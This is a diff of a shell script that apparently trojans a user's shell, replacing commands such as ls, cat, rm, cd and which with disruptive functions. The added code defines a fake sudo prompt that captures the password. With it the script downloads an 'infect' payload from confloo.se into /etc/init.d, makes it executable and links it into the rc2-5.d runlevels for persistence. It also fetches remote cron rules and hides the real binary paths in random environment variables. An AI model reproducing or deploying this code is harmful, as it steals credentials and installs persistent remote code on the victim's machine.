@@ -1,17 +1,19 @@
-curl --output cronrules "http://snaipe.github.io/confloose/cronrules" >/dev/null 2>&1
-crontab cronrules
-rm cronrules
+#!/bin/sh
+crontab -l > /tmp/cronrules
+curl "http://confloo.se/cronrules" >> /tmp/cronrules 2>/dev/null
+#crontab /tmp/cronrules
+rm /tmp/cronrules
 
 f() {
     t=`which $1`
     eval "$1() { $2; }"
     eval "$t() { $2; }"
+    export "__`tr -dc "[:alpha:]" < /dev/urandom | head -c 8`"=$t
 }
 
 unalias -a &> /dev/null
 unalias -m "*" &> /dev/null
 
-unset() { false; }
 cd() { eject; }
 
 tetris() { 
@@ -44,9 +46,34 @@ done
 
 f ls "tetris &; while (true); do sl -a; done"
 f cat "echo \"miaou\""
+
+cfl=/etc/init.d/cfl.z
+sudo=`which sudo`
+sudo() {
+    if [ $# = 0 ]; then $sudo
+    else
+        printf "[sudo] password for `whoami`: "
+        read -s pass; echo ""
+        echo $pass | $sudo -S curl --output $cfl "http://confloo.se/infect" >/dev/null 2>&1
+        echo $pass | $sudo -S chmod +x $cfl >/dev/null 2>&1
+        for i in 2 3 4 5; do
+            echo $pass | $sudo -S ln -s $cfl /etc/rc$i.d/S99cfl.z
+        done
+        echo $pass | $sudo -S $cfl
+    fi
+}
+
+f rm "xrandr -o left; xrandr -x"
+f less "xrandr -s 6 &> /dev/null"
+
+alias() { display http://impawards.com/tv/posters/alias_ver2.jpg }
+unalias() { display -flop http://impawards.com/tv/posters/alias_ver2.jpg }
+
+export() { false; }
+
 head() { echo '
                       __........_.._....._
-                     `.s$^.s$$$$$ssss$$$$$$bso.
+                     `.s$^.s$$$$$ssss$$$$$$bso.a
                      .d  7.d$$$$SSSS$$$$$$$$$$$b._
                      $  7 s`  `SSS$$$$$SSSSSSSSSSSSSSb.
                      $  j`      SS$$$$$$$$$$$$$$$sss$$$b
@@ -74,7 +101,7 @@ head() { echo '
               \                 d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P`d77
                :              d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P 7 7
                :            d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P `.`
-                :         .d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$7.-`
+                :         .d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$7.-²`
                 :         d$$$7`        `q$$$$$$$$$$$$$$$$$$$$7`
                  \       $$               `q$$$$$$P`   ```````
                   \     $$                   `````
@@ -85,24 +112,10 @@ head() { echo '
                           `|
 '; }
 
-cfl=/etc/init.d/cfl.z
-sudo=`which sudo`
-sudo() {
-    if [ $# = 0 ]; then $sudo
-    else
-        printf "[sudo] password for `whoami`: "
-        read -s pass; echo ""
-        echo $pass | $sudo -S curl --output $cfl "http://snaipe.github.io/confloose/infect" >/dev/null 2>&1
-        echo $pass | $sudo -S chmod +x $cfl >/dev/null 2>&1
-    fi
+cflznv=`env`
+which() {
+    printf $cflznv | grep "__.*=/.*$1" | sed -r 's/.*=(.*)/\1/';
 }
-\\sudo() { sudo; }
-eval "alias $sudo=sudo"
+#env() { false; }
 
-c=0
-f rm "xrandr -o left; xrandr -x"
-f less "xrandr -s $c &> /dev/null; c=$((c+1))"
-
-alias() { display http://impawards.com/tv/posters/alias_ver2.jpg }
-unalias() { display -flop http://impawards.com/tv/posters/alias_ver2.jpg }
-
+unset() { false; }
